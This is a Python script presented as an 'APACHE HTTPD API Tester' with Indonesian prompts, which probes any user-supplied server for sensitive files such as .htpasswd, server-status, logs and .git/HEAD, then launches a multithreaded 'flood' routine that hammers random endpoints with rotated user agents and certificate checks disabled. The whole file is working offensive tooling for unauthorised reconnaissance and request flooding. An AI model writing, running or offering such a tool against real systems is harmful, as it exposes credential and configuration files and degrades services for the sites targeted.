import time
import json
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ApacheAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Apache-specific endpoints and paths to test
        self.endpoints = [
            "",  # Root path
            "server-status",
            "server-info",
            ".htaccess",
            ".htpasswd",
            "apache_status",
            "apache2.conf",
            "httpd.conf",
            "cgi-bin/",
            "icons/",
            "manual/",
            "error/",
            "phpmyadmin/",
            "php-my-admin/",
            "xampp/",
            "test.php",
            "info.php",
            "phpinfo.php",
            "status",
            "perl-status",
            "server-status/",
            "webdav/",
            "access_log",
            "error_log",
            "apache/logs/",
            "logs/",
            "conf/",
            "php.ini",
            "web.config"
        ]
        # Common file extensions to check
        self.file_extensions = [
            ".php", ".cgi", ".pl", ".bak", ".old", ".backup", 
            ".conf", ".log", ".inc", ".htaccess", ".htpasswd"
        ]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def send_request(self, method, url, endpoint):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            else:
                response = requests.post(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            
            server_header = response.headers.get('Server', '')
            if any(x in server_header.lower() for x in ['apache', 'httpd']):
                print(f"[{response.status_code}] {method} {full_url} - Apache Detected: {server_header}")
                # Check for specific Apache version disclosure
                if 'apache/' in server_header.lower():
                    print(f"[INFO] Apache version disclosed: {server_header}")
            else:
                print(f"[{response.status_code}] {method} {full_url}")
                
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def test_apache_config(self, url):
        """Test for common Apache misconfigurations and sensitive files"""
        tests = [
            "/.htaccess",           # Apache config file
            "/.htpasswd",           # Password file
            "/server-status",       # Server status page
            "/server-info",         # Server info page
            "/manual/",             # Apache manual
            "/icons/",              # Apache icons directory
            "/cgi-bin/",           # CGI scripts directory
            "/php.ini",            # PHP configuration
            "/apache2.conf",       # Apache configuration
            "/logs/access.log",    # Access logs
            "/logs/error.log",     # Error logs
            "/.svn/entries",       # SVN repository
            "/.git/HEAD",          # Git repository
            "/phpinfo.php",        # PHP info page
            "/test.php",           # Test PHP file
        ]
        for test in tests:
            self.send_request("GET", url, test)

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting test on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                if random.random() < 0.3:  # 30% chance to append file extension
                    endpoint += random.choice(self.file_extensions)
                method = random.choice(["GET", "HEAD", "POST", "OPTIONS"])  # Added OPTIONS method
                self.send_request(method, url, endpoint)
                time.sleep(random.uniform(0.1, 0.3))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    print("""
    ╔════════════════════════════════════════╗
    ║         APACHE HTTPD API Tester        ║
    ║            coded by Danz               ║
    ╚════════════════════════════════════════╝
    """)
    
    target_url = input("Masukan target Apache URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        workers = int(input("Masukan number of threads (default: 20): ") or 20)
        duration = int(input("Masukan duration in seconds (default: 120): ") or 120)
        
        tester = ApacheAPITester()
        print("[INFO] Testing common Apache configurations...")
        tester.test_apache_config(target_url)
        print("[INFO] Starting main test...")
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except ValueError:
        print("[ERROR] Please enter valid numbers for threads and duration.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
